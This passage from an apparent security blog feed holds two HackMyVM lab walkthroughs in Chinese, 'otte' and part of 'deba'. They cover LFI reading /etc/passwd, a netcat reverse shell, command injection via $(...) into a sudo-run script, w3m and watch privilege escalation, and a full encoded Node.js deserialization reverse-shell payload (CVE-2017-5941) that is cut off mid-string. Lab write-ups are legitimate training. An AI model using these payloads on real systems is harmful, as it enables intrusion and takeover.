图片并没有隐藏什么信息<br><br>这里爆破命令也需要进行Basic认证<br>┌──(root㉿kali)-[~/Desktop/hmv/otte]
└─# gobuster dir -U root -P zP2wxY4uE -u http://192.168.56.27 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x php
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.56.27
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Auth User:               root
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 278]
/index.php            (Status: 200) [Size: 28]
/image                (Status: 200) [Size: 47076]
/config.php           (Status: 200) [Size: 0]
/thinkgeek.php        (Status: 200) [Size: 28]
<br>获取到了一个路径 thinkgeek.php，访问后还是首页的那张照片<br>┌──(root㉿kali)-[~/Desktop/hmv/otte]
└─# curl http://192.168.56.27/thinkgeek.php -H "Authorization: Basic cm9vdDp6UDJ3eFk0dUU"
&lt;img src="image.jpg" alt=""&gt;     
<br><br>使用arjun爆破出参数 file<br>┌──(root㉿kali)-[~/Desktop/hmv/otte]
└─# arjun -u http://192.168.56.27/thinkgeek.php --headers "Authorization: Basic cm9vdDp6UDJ3eFk0dUU"
    _
   /_| _ '
  (  |/ /(//) v2.2.7
      _/

[*] Scanning 0/1: http://192.168.56.27/thinkgeek.php
[*] Probing the target for stability
[*] Analysing HTTP response for anomalies
[*] Logicforcing the URL endpoint
[✓] parameter detected: file, based on: body length
[+] Parameters found: file

<br>根据参数就能猜测出这里大概率是一个LFI<br>┌──(root㉿kali)-[~/Desktop/hmv/otte]
└─# curl http://192.168.56.27/thinkgeek.php?file=../../../../../../etc/passwd -H "Authorization: Basic cm9vdDp6UDJ3eFk0dUU"
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
thomas:x:1000:1000:thomas,,,:/home/thomas:/bin/bash
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
mysql:x:106:113:MySQL Server,,,:/nonexistent:/bin/false
proftpd:x:107:65534::/run/proftpd:/usr/sbin/nologin
ftp:x:108:65534::/srv/ftp:/usr/sbin/nologin
laetitia:x:1001:1001:,,,:/home/laetitia:/bin/bash
cedric:x:1002:1002:,,,:/home/cedric:/bin/bash

<br>测试出来也是一个LFI <br>然后尝试读取私钥但是没有权限。<br>
根据提示告诉我们 thomas 用户目录下有一个php文件很重要，我们将其爆破出来<br>┌──(root㉿kali)-[~/Desktop/hmv/otte]
└─# ffuf -u http://192.168.56.27/thinkgeek.php?file=../../../../../../home/thomas/FUZZ.php -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -H "Authorization: Basic cm9vdDp6UDJ3eFk0dUU" |grep -v "Size: 0"

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.56.27/thinkgeek.php?file=../../../../../../home/thomas/FUZZ.php
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 :: Header           : Authorization: Basic cm9vdDp6UDJ3eFk0dUU
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

shell                   [Status: 200, Size: 20, Words: 3, Lines: 3, Duration: 11ms]



<br>发现一个 shell.php <br>┌──(root㉿kali)-[~/Desktop/tools]
└─# curl http://192.168.56.27/thinkgeek.php?file=../../../../../../../home/thomas/shell.php -H "Authorization: Basic cm9vdDp6UDJ3eFk0dUU"
Have fun !&lt;br&gt;&lt;br&gt;
<br>爆破一下参数<br>┌──(root㉿kali)-[~/Desktop/hmv/otte]
└─# ffuf -u "http://192.168.56.27/thinkgeek.php?file=../../../../../../home/thomas/shell.php&amp;FUZZ=whoami"  -w /usr/share/wordlists/parameter.txt -H "Authorization: Basic cm9vdDp6UDJ3eFk0dUU" |grep -v "Size: 20"

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.56.27/thinkgeek.php?file=../../../../../../home/thomas/shell.php&amp;FUZZ=whoami
 :: Wordlist         : FUZZ: /usr/share/wordlists/parameter.txt
 :: Header           : Authorization: Basic cm9vdDp6UDJ3eFk0dUU
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

file                    [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 3ms]
command                 [Status: 200, Size: 29, Words: 3, Lines: 4, Duration: 398ms]
:: Progress: [5846/5846] :: Job [1/1] :: 956 req/sec :: Duration: [0:00:06] :: Errors: 0 ::

<br>注意这里由于前面已经使用了一个参数file了，要爆破另外一个参数只能用&amp;<br>
而且arjun好像不能爆破双参数的这种。这里我选择用ffuf爆破<br>爆破出参数是 command<br>┌──(root㉿kali)-[~/Desktop/hmv/otte]
└─# curl "http://192.168.56.27/thinkgeek.php?file=../../../../../../../home/thomas/shell.php&amp;command=whoami" -H "Authorization: Basic cm9vdDp6UDJ3eFk0dUU"
Have fun !&lt;br&gt;&lt;br&gt;

www-data

<br>然后反弹shell即可<br>┌──(root㉿kali)-[~/Desktop/hmv/otte]
└─# pwncat-cs -lp 1234

[01:15:41] Welcome to pwncat 🐈!                                                                  __main__.py:164
[01:17:04] received connection from 192.168.56.27:44386                                                bind.py:84
[01:17:04] 192.168.56.27:44386: registered new host w/ db                                          manager.py:957
(local) pwncat$
(remote) www-data@otte:/var/www/html$ whoami
www-data
<br><br><br>在 thomas 目录下有一个提示<br>(remote) www-data@otte:/home/thomas$ cat nightmare.txt
who is the son of a bitch who replaced the signature on my file with fucking XXX?! I need to find the original signature!

<br>
翻译：是谁这个混蛋把我文件的签名替换成了该死的 XXX？！我需要找到原来的签名！
<br>意思是我们要恢复一个文件的签名,而这个文件就是同目录下的 important_file<br>(remote) www-data@otte:/home/thomas$ head important_file
00000000: XXXXXXXXXXXXXXXX 0000 000d 4948 4452  .XXX........IHDR
00000010: 0000 012c 0000 012c 0806 0000 0079 7d8e  ...,...,.....y}.
00000020: 7500 0000 1b74 4558 7443 7265 6174 696f  u....tEXtCreatio
00000030: 6e20 5469 6d65 0031 3632 3130 3037 3337  n Time.162100737
00000040: 3935 3239 15fc b9e2 0000 37e9 4944 4154  9529......7.IDAT
00000050: 78da ed9d 8bab 7ecf 55de f38f 168a 2085  x.....~.U..... .
00000060: 2214 410a 2208 2294 8214 4428 8582 286a  ".A."."...D(..(j
00000070: bd50 898a d6b6 62b0 28a2 a849 9a18 a3b9  .P....b.(..I....
00000080: 7889 a931 3626 8d9a 8ba6 8947 3e5f ddb8  x..16&amp;.....G&gt;_..
00000090: ddee 99f5 ccac 35b3 67ef 773d 3090 7c7f  ......5.g.w=0.|.

<br>可以发现签名的文件头变成了XXXX<br>
但是经常玩CTF 杂项的师傅肯定就可以发现第一行有一个 IHDR 这个经常在Png图片里面出现<br>
然后只需要找一个png图片提取出它前面的16进制替换掉即可<br>
8950 4E47 0D0A 1A0A<br>
然后导出即可<br>
<img alt="Pasted image 20241228143249" src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241228143249.png" referrerpolicy="no-referrer"> <br>导出后可以得到一张二维码<br>
<img alt="download" src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/download.png" referrerpolicy="no-referrer"><br>
解析后获取到一个网站 <a rel="noopener nofollow" class="external-link" href="https://eqrcode.co/a/SVxQdM" target="_blank">https://eqrcode.co/a/SVxQdM</a><br>
访问网站可以获取到thomas账户的密码 thomas:youareonthegoodwaybro<br><br>thomas@otte:~$ sudo -l
Matching Defaults entries for thomas on otte:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User thomas may run the following commands on otte:
    (laetitia) NOPASSWD: /usr/bin/python3 /home/laetitia/simpler.py *

<br><br>观察代码在 exec_ping 处发现了可以利用的地方<br>thomas@otte:~$ cat /home/laetitia/simpler.py
...
def exec_ping():
    forbidden = ['&amp;', ';', '-', '`', '||', '|']
    command = input('Enter an IP: ')
    for i in forbidden:
        if i in command:
            print('Got you')
            exit()
    os.system('ping ' + command)

<br>这里没有过滤 $ ，导致我们可以使用 命令替换语法$(...) 进行绕过<br>
我们先写一个反弹shell的脚本<br>thomas@otte:/tmp$ echo 'nc -e /bin/bash 192.168.56.6 2233' &gt;shell.sh
<br>然后执行脚本反弹shell实现提权<br>thomas@otte:/tmp$ sudo -u laetitia /usr/bin/python3 /home/laetitia/simpler.py -p
***********************************************
     _                 _
 ___(_)_ __ ___  _ __ | | ___ _ __ _ __  _   _
/ __| | '_ ` _ \| '_ \| |/ _ \ '__| '_ \| | | |
\__ \ | | | | | | |_) | |  __/ |_ | |_) | |_| |
|___/_|_| |_| |_| .__/|_|\___|_(_)| .__/ \__, |
                |_|               |_|    |___/
                                @ironhackers.es

***********************************************

Enter an IP: $(bash /tmp/shell.sh)

<br>┌──(root㉿kali)-[~/Desktop/hmv/otte]
└─# pwncat-cs -lp 2233

(local) pwncat$
(remote) laetitia@otte:/tmp$ whoami
laetitia

<br><br>(remote) laetitia@otte:/tmp$ sudo -l
Matching Defaults entries for laetitia on otte:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User laetitia may run the following commands on otte:
    (cedric) NOPASSWD:  

<br><img alt="Pasted image 20241228150404" src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241228150404.png" referrerpolicy="no-referrer"><br>
这里有一个文件读取，<br>
但是w3m的交互模式是可以执行命令的<br>
利用交换模式提权即可<br>(remote) laetitia@otte:/home/laetitia/.w3m$ sudo -u cedric /usr/bin/w3m "/etc/passwd"
进去后 执行 ！bash
cedric@otte:/home/laetitia/.w3m$ whoami
cedric

(remote) cedric@otte:/home/cedric$ cat user.txt
e1e4e2e00a00df7b40c5436155ab4996
<br><br>进来后有一个id_rsa<br>(remote) cedric@otte:/home/cedric$ ls
id_rsa  user.txt
<br>发现是root的私钥<br>┌──(root㉿kali)-[~/Desktop/hmv/otte]
└─# chmod 600 id_rsa

┌──(root㉿kali)-[~/Desktop/hmv/otte]
└─# ssh-keygen -y -f id_rsa
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCzc3fvk0OLTl7Mx2VF6cr9A6AfAIV05BjNmrBnJ+lxNtP4fYzYjnvxNDtv3lbeLHsyuZD6C29nPCpvi7hUdX5tjjt5e8aFcH5Wtu1zOouXjs8RV6tCUBp433igqXwbVl1WKeQ7vYO+yuqBBacJNkXPU0e0ROwXBFWDklOYwSvnRW6Yi3VK7MQueQgP+3+ajLnwpmpOxndi3hCNwOppUlDNhEm6f8rJ4zatAXPP5SMIp6/P3c98Qjn0zHdkI7t3kL6HU5uGwQsQi3WJGz18YavwyjXHSlQLlwhTDGgOSQ6zpx4WJ7iY7mK/dL1c7CNoF115rpgqHyFJQCdlvsgIJ9jN root@otte
<br>直接ssh上去即可<br>root@otte:~# cat root.txt
84decf19261819687b63c8210cd28f7c
<br><br>(remote) cedric@otte:/home/cedric$ sudo -l
Matching Defaults entries for cedric on otte:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User cedric may run the following commands on otte:
    (ALL : ALL) NOPASSWD: /usr/bin/mmwatch

<br>mmwatch 实际上就是一个python脚本，他调用了 watch 程序，我们可以利用 watch 的提权方式用它进行提权<br>
<img alt="Pasted image 20241228152217" src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241228152217.png" referrerpolicy="no-referrer"><br>sudo -u root mmwatch  -x "sh -c 'reset; exec sh 1&gt;&amp;0 2&gt;&amp;0'"
(remote) root@otte:/home/cedric$ id
uid=0(root) gid=0(root) groups=0(root)

]]></description><link>https://www.c1trus.top/24-渗透/hmv/49.otte.html</link><guid isPermaLink="false">24-渗透/HMV/49.otte.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Mon, 30 Dec 2024 14:05:08 GMT</pubDate><enclosure url="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241228123243.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241228123243.png"&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[48.deba]]></title><description><![CDATA[ 
 <br><br>
<br><a data-tooltip-position="top" aria-label="1. 基本信息^toc" data-href="#1. 基本信息^toc" href="https://www.c1trus.top/about:blank#1._基本信息^toc" class="internal-link" target="_self" rel="noopener nofollow">1. 基本信息</a>
<br><a data-tooltip-position="top" aria-label="2. 信息收集" data-href="#2. 信息收集" href="https://www.c1trus.top/about:blank#2._信息收集" class="internal-link" target="_self" rel="noopener nofollow">2. 信息收集</a>

<br><a data-tooltip-position="top" aria-label="2.1. 端口扫描" data-href="#2.1. 端口扫描" href="https://www.c1trus.top/about:blank#2.1._端口扫描" class="internal-link" target="_self" rel="noopener nofollow">2.1. 端口扫描</a>
<br><a data-tooltip-position="top" aria-label="2.2. 目录扫描" data-href="#2.2. 目录扫描" href="https://www.c1trus.top/about:blank#2.2._目录扫描" class="internal-link" target="_self" rel="noopener nofollow">2.2. 目录扫描</a>


<br><a data-tooltip-position="top" aria-label="3. nodejs反序列化 (CVE-2017-5941)" data-href="#3. nodejs反序列化 (CVE-2017-5941)" href="https://www.c1trus.top/about:blank#3._nodejs反序列化_(CVE-2017-5941)" class="internal-link" target="_self" rel="noopener nofollow">3. nodejs反序列化 (CVE-2017-5941)</a>
<br><a data-tooltip-position="top" aria-label="4. www-data提权low用户" data-href="#4. www-data提权low用户" href="https://www.c1trus.top/about:blank#4._www-data提权low用户" class="internal-link" target="_self" rel="noopener nofollow">4. www-data提权low用户</a>
<br><a data-tooltip-position="top" aria-label="5. 定时任务提权" data-href="#5. 定时任务提权" href="https://www.c1trus.top/about:blank#5._定时任务提权" class="internal-link" target="_self" rel="noopener nofollow">5. 定时任务提权</a>
<br><a data-tooltip-position="top" aria-label="6. wine命令 提权root" data-href="#6. wine命令 提权root" href="https://www.c1trus.top/about:blank#6._wine命令_提权root" class="internal-link" target="_self" rel="noopener nofollow">6. wine命令 提权root</a><br>
- <a data-tooltip-position="top" aria-label="6.1. 利用CS获取root" data-href="#6.1. 利用CS获取root" href="https://www.c1trus.top/about:blank#6.1._利用CS获取root" class="internal-link" target="_self" rel="noopener nofollow">6.1. 利用CS获取root</a><br>
靶机链接 <a rel="noopener nofollow" class="external-link" href="https://hackmyvm.eu/machines/machine.php?vm=Deba" target="_blank">https://hackmyvm.eu/machines/machine.php?vm=Deba</a><br>
作者 <a data-tooltip-position="top" aria-label="https://hackmyvm.eu/profile/?user=nolose" rel="noopener nofollow" class="external-link" href="https://hackmyvm.eu/profile/?user=nolose" target="_blank">nolose</a><br>
难度 ⭐️⭐️⭐️⭐️⭐️<br>
参考文章 <a rel="noopener nofollow" class="external-link" href="https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/" target="_blank">https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/</a>
<br><br><br>┌──(root㉿kali)-[~/Desktop/hmv/deba]
└─# nmap 192.168.56.26 -p-
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-26 11:28 EST
Nmap scan report for 192.168.56.26
Host is up (0.00075s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
3000/tcp open  ppp
MAC Address: 08:00:27:2F:C3:52 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 2.80 seconds

<br>首页是apache<br>
<img alt="Pasted image 20241227002954" src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241227002954.png" referrerpolicy="no-referrer"><br>
3000端口首页<br>┌──(root㉿kali)-[~/Desktop/hmv/deba]
└─# curl http://192.168.56.26:3000/
Hello World 
<br><br>┌──(root㉿kali)-[~/Desktop/hmv/deba]
└─# dirsearch -u http://192.168.56.26 -x 403
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /root/Desktop/hmv/deba/reports/http_192.168.56.26/_24-12-26_11-30-56.txt

Target: http://192.168.56.26/

[11:30:56] Starting:
[11:31:09] 301 -  321B  - /node_modules  -&gt;  http://192.168.56.26/node_modules/
[11:31:09] 200 -  992B  - /node_modules/
[11:31:09] 200 -  116B  - /package.json
[11:31:09] 200 -   32KB - /package-lock.json
[11:31:12] 200 -  386B  - /server.js

Task Completed

┌──(root㉿kali)-[~/Desktop/hmv/deba]
└─# dirsearch -u http://192.168.56.26:3000 -x 403
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /root/Desktop/hmv/deba/reports/http_192.168.56.26_3000/_24-12-26_11-31-27.txt

Target: http://192.168.56.26:3000/

[11:31:27] Starting:

Task Completed

<br>发现一个nodejs的源码<br>┌──(root㉿kali)-[~/Desktop/hmv/deba]
└─# curl http://192.168.56.26//server.js
var express = require('express');
var cookieParser = require('cookie-parser');
var escape = require('escape-html');
var serialize = require('node-serialize');
var app = express();
app.use(cookieParser())
app.get('/', function(req, res) {
    if (req.cookies.profile) {
        var str = new Buffer(req.cookies.profile,'base64').toString();
        var obj = serialize.unserialize(str);
    if (obj.username) {
        res.send("Hello " + escape(obj.username));
    }

    } else {
        res.cookie('profile',"eyJ1c2VybmFtZSI6ImFqaW4iLCJjb3VudHJ5IjoiaW5kaWEiLCJjaXR5IjoiYmFuZ2Fsb3JlIn0=", { maxAge: 900000, httpOnly: true});
    }
res.send("Hello World");
});
app.listen(3000);
<br>
分析代码可知 访问 http://192.168.56.26:3000/ Web 应用程序中会检查客户端请求中是否带有名为 profile 的 Cookie，<br>
如果有，则会将其解码为 Base64 字符串，并使用 serialize.unserialize 将字符串反序列化为对象，<br>
由于Cookie是我们可以控制的，所以我们可以使用恶意cookie来利用这个反序列化漏洞
<br>我们可以先简单测试一下，如修改名字<br>┌──(root㉿kali)-[~/Desktop/hmv/deba]
└─# echo "eyJ1c2VybmFtZSI6ImFqaW4iLCJjb3VudHJ5IjoiaW5kaWEiLCJjaXR5IjoiYmFuZ2Fsb3JlIn0=" |base64 -d
{"username":"ajin","country":"india","city":"bangalore"} 

修改username的值
┌──(root㉿kali)-[~/Desktop/hmv/deba]
└─# echo -n "{"username":"c1trus","country":"india","city":"bangalore"}"  |base64
e3VzZXJuYW1lOmMxdHJ1cyxjb3VudHJ5OmluZGlhLGNpdHk6YmFuZ2Fsb3JlfQ==

┌──(root㉿kali)-[~/Desktop/hmv/deba]
└─#  curl http://192.168.56.26:3000/ -b "profile=eyJ1c2VybmFtZSI6ImMxdHJ1cyIsImNvdW50cnkiOiJpbmRpYSIsImNpdHkiOiJiYW5nYWxvcmUifQ=="
Hello c1trus 
<br>可以发现确实被修改了<br>下面我们尝试利用这个反序列化漏洞 进行反弹shell<br>
这里有一个现成的反弹shell利用脚本<br>
<a rel="noopener nofollow" class="external-link" href="https://github.com/ajinabraham/Node.Js-Security-Course/blob/master/nodejsshell.py" target="_blank">https://github.com/ajinabraham/Node.Js-Security-Course/blob/master/nodejsshell.py</a><br><br>
这里其实就是利用的 <a data-tooltip-position="top" aria-label="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5941" rel="noopener nofollow" class="external-link" href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5941" target="_blank">CVE-2017-5941</a><br>
如果感兴趣，这里有在线的<a data-tooltip-position="top" aria-label="https://yunjing.ichunqiu.com/cve/detail/923?pay=2" rel="noopener nofollow" class="external-link" href="https://yunjing.ichunqiu.com/cve/detail/923?pay=2" target="_blank">免费靶场</a>让你复现
<br>利用脚本生成反弹shell的payload<br>
注意 :脚本要用python2运行<br>┌──(root㉿kali)-[~/Desktop/hmv/deba]
└─# python2 nodejsshell.py 192.168.56.6 1234
[+] LHOST = 192.168.56.6
[+] LPORT = 1234
[+] Encoding
eval(String.fromCharCode(10,118,97,114,32,110,101,116,32,61,32,114,101,113,117,105,114,101,40,39,110,101,116,39,41,59,10,118,97,114,32,115,112,97,119,110,32,61,32,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,115,112,97,119,110,59,10,72,79,83,84,61,34,49,57,50,46,49,54,56,46,53,54,46,54,34,59,10,80,79,82,84,61,34,49,50,51,52,34,59,10,84,73,77,69,79,85,84,61,34,53,48,48,48,34,59,10,105,102,32,40,116,121,112,101,111,102,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,61,61,32,39,117,110,100,101,102,105,110,101,100,39,41,32,123,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,32,102,117,110,99,116,105,111,110,40,105,116,41,32,123,32,114,101,116,117,114,110,32,116,104,105,115,46,105,110,100,101,120,79,102,40,105,116,41,32,33,61,32,45,49,59,32,125,59,32,125,10,102,117,110,99,116,105,111,110,32,99,40,72,79,83,84,44,80,79,82,84,41,32,123,10,32,32,32,32,118,97,114,32,99,108,105,101,110,116,32,61,32,110,101,119,32,110,101,116,46,83,111,99,107,101,116,40,41,59,10,32,32,32,32,99,108,105,101,110,116,46,99,111,110,110,101,99,116,40,80,79,82,84,44,32,72,79,83,84,44,32,102,117,110,99,116,105,111,110,40,41,32,123,10,32,32,32,32,32,32,32,32,118,97,114,32,115,104,32,61,32,115,112,97,119,110,40,39,47,98,105,110,47,115,104,39,44,91,93,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,119,114,105,116,101,40,34,67,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,112,105,112,101,40,115,104,46,115,116,100,105,110,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,111,117,116,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,101,114,114,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,111,110,40,39,101,120,105,116,39,44,102,117,110,99,116,105,111,110,40,99,111,100,101,44,115,105,103,110,97,108,41,123,10,32,32,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,101,110,100,40,34,68,105,115,99,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,125,41,59,10,32,32,32,32,125,41,59,10,32,32,32,32,99,108,105,101,110,116,46,111,110,40,39,101,114,114,111,114,39,44,32,102,117,110,99,116,105,111,110,40,101,41,32,123,10,32,32,32,32,32,32,32,32,115,101,116,84,105,109,101,111,117,116,40,99,40,72,79,83,84,44,80,79,82,84,41,44,32,84,73,77,69,79,85,84,41,59,10,32,32,32,32,125,41,59,10,125,10,99,40,72,79,83,84,44,80,79,82,84,41,59,10))
<br>然后对payload进行base64编码<br>构造序列化代码<br>{"c1trus": "_$$ND_FUNC$$_function () { 上面生成的payload }()"}
<br>然后对这个构造出来的payload进行base64编码<br>eyJjMXRydXMiOiAiXyQkTkRfRlVOQyQkX2Z1bmN0aW9uICgpIHtldmFsKFN0cmluZy5mcm9tQ2hhckNvZGUoMTAsMTE4LDk3LDExNCwzMiwxMTAsMTAxLDExNiwzMiw2MSwzMiwxMTQsMTAxLDExMywxMTcsMTA1LDExNCwxMDEsNDAsMzksMTEwLDEwMSwxMTYsMzksNDEsNTksMTAsMTE4LDk3LDExNCwzMiwxMTUsMTEyLDk3LDExOSwxMTAsMzIsNjEsMzIsMTE0LDEwMSwxMTMsMTE3LDEwNSwxMTQsMTAxLDQwLDM5LDk5LDEwNCwxMDUsMTA4LDEwMCw5NSwxMTIsMTE0LDExMSw5OSwxMDEsMTE1LDExNSwzOSw0MSw0NiwxMTUsMTEyLDk3LDExOSwxMTAsNTksMTAsNzIsNzksODMsODQsNjEsMzQsNDksNTcsNTAsNDYsNDksNTQsNTYsNDYsNTMsNTQsNDYsNTQsMzQsNTksMTAsODAsNzksODIsODQsNjEsMzQsNDksNTAsNTEsNTIsMzQsNTksMTAsODQsNzMsNzcsNjksNzksODUsODQsNjEsMzQsNTMsNDgsNDgsNDgsMzQsNTksMTAsMTA1LDEwMiwzMiw0MCwxMTYsMTIxLDExMiwxMDEsMTExLDEwMiwzMiw4MywxMTYsMTE0LDEwNSwxMTAsMTAzLDQ2LDExMiwxMTQsMTExLDExNiwxMTEsMTE2LDEyMSwxMTIsMTAxLDQ2LDk5LDExMSwxMTAsMTE2LDk3LDEwNSwxMTAsMTE1LDMyLDYxLDYxLDYxLDMyLDM5LDExNywxMTAsMTAwLDEwMSwxMDIsMTA1LDExMCwxMDEsMTAwLDM5LDQxLDMyLDEyMywzMiw4MywxMTYsMTE0LDEwNSwxMTAsMTAzLDQ2LDExMiwxMTQsMTExLDExNiwxMTEsMTE2LDEyMSwxMTIsMTAxLDQ2LDk5LDExMSwxMTAsMTE2LDk3LDEwNSwxMTAsMTE1LDMyLDYxLDMyLDEwMiwxMTcsMTEwLDk5LDExNiwxMDUsMTExLDExMCw0MCwxMDUsMTE2LDQxLDMyLDEyMywzMiwxMTQsMTAxLDExNiwxMTcsMTE0LDExMCwzMiwxMTYsMTA0LDEwNSwxMTUsNDYsMTA1LDExMCwxMDAsMTAxLDEyMCw3OSwxMDIsNDAsMTA1LDExNiw0MSwzMiwzMyw2MSwzMiw0NSw0OSw1OSwzMiwxMjUsNTksMzIsMTI1LDEwLDEwMiwxMTcsMTEwLDk5LDExNiwxMDUsMTExLDExMCwzMiw5OSw0MCw3Miw3OSw4Myw4NCw0NCw4MCw3OSw4Miw4NCw0MSwzMiwxMjMsMTAsMzIsMzIsMzIsMzIsMTE4LDk3LDExNCwzMiw5OSwxMDgsMTA1LDEwMSwxMTAsMTE2LDMyLDYxLDMyLDExMCwxMDEsMTE5LDMyLDExMCwxMDEsMTE2LDQ2LDgzLDExMSw5OSwxMDcsMTAxLDExNiw0MCw0MSw1OSwxMCwzMiwzMiwzMiwzMiw5OSwxMDgsMTA1LDEwMSwxMTAsMTE2LDQ2LDk5LDExMSwxMTAsMTEwLDEwMSw5OSwxMTYsNDAsODAsNzksODIsODQsNDQsMzIsNzIsNzksODMsODQsNDQsMzIsMTAyLDExNywxMTAsOTksMTE2LDEwNSwxMTEsMTEwLDQwLDQxLDMyLDEyMywxMCw